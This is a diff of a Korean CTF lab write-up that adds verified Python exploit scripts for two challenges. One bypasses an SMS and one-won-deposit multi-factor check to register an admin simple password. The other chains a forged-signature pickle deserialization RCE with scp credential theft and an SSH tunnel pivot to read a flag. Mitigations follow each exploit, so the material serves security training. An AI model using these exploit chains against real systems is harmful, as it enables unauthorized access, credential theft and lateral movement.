@@ -266,34 +266,71 @@ curl -s "http://localhost:9711/sys/exec-9f3a?key=Zx9_d3c0mp1l3_th1s_k3y_2026&cmd
 ```
 - **대응**: 간편비번 등록을 인증된 세션 사용자(`session['userid']`)로만 허용.
 
-### authbypass-advanced (:9005) — 강화판 (SMS + 계좌 1원 다중인증)
-- **변경점**: basic 우회 패치(`register_simplepass` 의 userid 가 `session['authid']` 로 고정) + **SMS·계좌1원 2중 인증** 추가.
-- **취약점(핵심)**: 인증 대상(`authid` = `register_simplepass?userid=` 인자)과 인증요소가 느슨하게 묶이고, **1원 입금 인증코드가 거래내역에 `계좌인증(XXXX)` 로 그대로 노출**(`transfer_history`).
-- **풀이(개요)**:
-```
-1) GET /register_simplepass?userid=admin           # authid=admin 지정
-2) SMS 인증 우회(messages 흐름) → /smsauth 통과 → /acctauth 로 이동
-3) 계좌 1원 인증: send_acctauth 가 내 계좌에 1원 입금(from_address=4자리 코드).
-   /transfer_history 에서 '계좌인증(XXXX)' 4자리 코드 확인 →
-   POST /acctauth  authnum=<XXXX>                  # acctauth_success
-4) POST /register_simplepass  simplepass1=123456&simplepass2=123456  # admin 간편비번 등록
-5) POST /login_simplepass → admin → GET /getflag → flag{...}
-```
-- **대응**: 각 인증요소를 인증 대상(세션)과 강하게 바인딩 · 인증코드 비노출.
+### authbypass-advanced (:9005) — 강화판 (SMS + 계좌 1원 다중인증)  ✓ 실익스플로잇 검증됨
+- **변경점(패치)**: basic 의 폼-userid 결함을 막아 `register_simplepass` 가 `userid=session['authid']` 로 동작. 추가로 **SMS 인증 + 계좌 1원 인증** 2중 도입.
+- **취약점(핵심)**: 등록 대상 `authid`(= `register_simplepass?userid=` 로 세션 저장)와 인증요소가 **바인딩되지 않음**.
+  - SMS 2FA 결과 `session['2factor_success']` 는 단순 불리언 → *내 계정으로* 통과시켜도 됨(누구의 인증인지 검사 안 함).
+  - 계좌 1원 인증코드가 `send_acctauth_msg` **응답에 그대로 노출**(`send auth num success <4자리>`), 입금은 `authid`(admin) 계좌로.
+  - 즉 "내 폰으로 SMS 통과 + admin 1원코드 응답 노출"로 **admin 의 간편비번을 등록**.
+- **풀이(파이썬, 표준 라이브러리)**:
+```python
+import urllib.request, urllib.parse, http.cookiejar, re
+B="http://localhost:9005"
+op=lambda: urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
+post=lambda o,u,d: o.open(u,urllib.parse.urlencode(d).encode(),timeout=10).read().decode()
+get =lambda o,u: o.open(u,timeout=10).read().decode()
 
-### secret-tunnel (:8090, SSH :2222) — 캡스톤 (역직렬화 RCE → SSH 피벗)
-- **취약점**: `extserver` `/process` 가 서명검증 후 `pickle.loads(base64decode(data))` → **역직렬화 RCE**. 서명키 `SECRET_KEY="very_secret_key_do_not_guess"` 가 소스에 하드코딩 → `md5(data+KEY)` 로 **서명 위조 가능**.
-- **풀이(체인)**:
+s=op(); u="hacker"; pw="pw12345"
+post(s,B+"/register",{"userid":u,"userpw":pw}); post(s,B+"/login",{"userid":u,"userpw":pw})
+phone=re.search(r"018-\d{4}-\d{4}", get(s,B+"/my")).group(0)          # 내 폰번호
+get(s,B+"/register_simplepass?userid=admin")                         # ① authid=admin 저장
+# ② SMS 2FA — 내 계정으로 통과(2factor_success). 자기 폰 코드만 읽힘.
+get(s,B+"/api/send_smsauth_msg?phonenum="+phone)
+code=get(s,B+"/api/get_sms_msg?phonenum="+phone).strip()
+post(s,B+"/smsauth",{"userid":u,"phonenum":phone,"authnum":code})
+# ③ 계좌 1원 인증 — authid(admin)에게 1원 + 코드가 응답에 노출
+acct=re.search(r"success\s+(\d{4})", get(s,B+"/api/send_acctauth_msg")).group(1)
+post(s,B+"/acctauth",{"authnum":acct})
+# ④ admin 간편비번 등록 → simplepass_key 확보
+key=re.search(r"simplepass_key','([0-9a-f]+)'",
+        post(s,B+"/register_simplepass",{"simplepass1":"123456","simplepass2":"123456"})).group(1)
+# ⑤ admin 으로 간편로그인 → getflag
+a=op(); post(a,B+"/login_simplepass",{"simplepass_key":key,"simplepass":"123456"})
+print(re.search(r"flag\{[^}]+\}", get(a,B+"/getflag")).group(0))      # → flag{...}
 ```
-1) 위조 서명 + 악성 pickle 으로 RCE:
-   data = base64( pickle.dumps(<__reduce__ 로 명령 실행하는 객체>) )   # 문자열 'pickle' 만 회피
-   sig  = md5(data + "very_secret_key_do_not_guess").hexdigest()
-   POST /process   data=<data>&signature=<sig>     → extserver 에서 명령 실행
-2) extserver 의 SSH 키(id_rsa)로 intserver 피벗(SSH 터널):
-   ssh -i id_rsa ... intserver   (extserver↔intserver)
-3) intserver 에서 내부전용 flagserver 접근(internal_network) → /flag.txt
+- **대응**: 인증요소(SMS·계좌)를 등록 대상(`authid`)·동일 세션·동일 사용자로 강하게 바인딩 · 인증코드 응답/내역 비노출.
+
+### secret-tunnel (:8090, SSH :2222) — 캡스톤 (역직렬화 RCE → SSH 터널 피벗)  ✓ 실익스플로잇 검증됨
+- **구성**: `extserver`(외부망·web+ssh) → `intserver`(외부+내부망·ctfuser=restricted shell) → `flagserver`(내부망 **전용**·flaguser/암호·`/home/flaguser/flag.txt`).
+- **취약점(체인)**:
+  - ① `extserver /process` 가 서명검증 후 `pickle.loads` → **역직렬화 RCE**. 서명키 `SECRET_KEY="very_secret_key_do_not_guess"` 하드코딩 → `md5(data+KEY)` 로 **서명 위조**.
+  - ② extserver 에 `id_rsa` 유출(intserver ctfuser 가 같은 공개키 신뢰).
+  - ③ ctfuser 쉘이 restricted 라도 `AllowTcpForwarding yes` → **scp·SSH 터널은 동작**(쉘 우회).
+- **풀이(파이썬)**:
+```python
+import pickle, base64, hashlib, subprocess, urllib.request, urllib.parse
+KEY="very_secret_key_do_not_guess"
+def rce(cmd):                       # 위조서명 + pickle RCE — 명령 출력이 응답으로 반환
+    full="("+cmd+") 2>&1; true"     # check_output 은 비0 종료 시 500 → '; true' 로 감쌈
+    class E:
+        def __reduce__(self): return (subprocess.check_output, (['sh','-c',full],))
+    data=base64.b64encode(pickle.dumps(E())).decode()           # 바이트에 'pickle' 만 없으면 필터 통과
+    sig=hashlib.md5((data+KEY).encode()).hexdigest()
+    body=urllib.parse.urlencode({"data":data,"signature":sig}).encode()
+    return urllib.request.urlopen("http://localhost:8090/process",body,timeout=50).read().decode()
+
+O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8"
+# ① intserver 에서 flagserver 비번 scp (restricted shell 이어도 scp 동작) → secretpassword1!
+rce("scp -i /home/appuser/.ssh/id_rsa %s ctfuser@intserver:/home/ctfuser/flagserver_password.txt /tmp/pw" % O)
+# ② intserver 경유 flagserver:22 터널(키인증) + flagserver 비번(askpass, sshpass 없음) → flag
+proxy="ssh -i /home/appuser/.ssh/id_rsa "+O+" -W %h:%p ctfuser@intserver"
+chain=("printf '#!/bin/sh\\necho secretpassword1!\\n'>/tmp/ap; chmod +x /tmp/ap; "
+       "SSH_ASKPASS=/tmp/ap SSH_ASKPASS_REQUIRE=force DISPLAY=x "
+       "ssh "+O+" -o ProxyCommand=\""+proxy+"\" flaguser@flagserver 'cat /home/flaguser/flag.txt'")
+print(rce(chain))      # → flag{...}
 ```
-- **대응**: 신뢰경계 입력에 pickle 금지(JSON/안전한 포맷) · 서명키 비공개 · 내부망 접근통제.
+> 사람이 직접 풀 땐: RCE 로 `id_rsa` 를 빼낸 뒤 `ssh -i id_rsa -p2222 appuser@<host>` 로 extserver 접속 → 위와 동일하게 `-J ctfuser@intserver flaguser@flagserver` 점프(터널)로 내부 flagserver 접근.
+- **대응**: 신뢰경계 입력에 `pickle` 금지(JSON 등 안전 포맷) · 서명키/자격증명 비공개·분리 · 내부망 접근통제·점프호스트 최소권한(restricted shell 만으론 터널 못 막음 → `AllowTcpForwarding no`).
 
 ---
 
